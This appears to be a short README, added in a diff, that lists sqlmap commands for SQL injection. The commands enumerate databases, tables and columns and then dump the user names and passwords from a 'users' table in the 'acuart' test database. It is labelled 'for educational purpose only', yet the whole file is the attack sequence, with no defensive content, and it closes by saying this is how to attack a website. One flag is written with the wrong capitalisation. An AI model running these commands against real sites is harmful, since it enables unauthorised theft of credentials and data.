@@ -1,0 +1,11 @@
+# SQL-Injections
+"For educational purpose only"
+commands for the sql injections using tool sqlmap
+
+sqlmap -u "URL" --dbs  (this command is for database checking)
+sqlmap -u "URL"  -D acuart  --Tables (attacking into the tables database)
+sqlmap -u "URL"  -D acuart  -T users --columns (for columns in the database)
+sqlmap -u "URL"  -D acuart  -T users -C uname --dump (for the user name in the database)
+sqlmap -u "URL"  -D acuart  -T users -C pass --dump (for the password of the user from database)
+
+like this we can attack(sql injection) the webiste by the above commands 
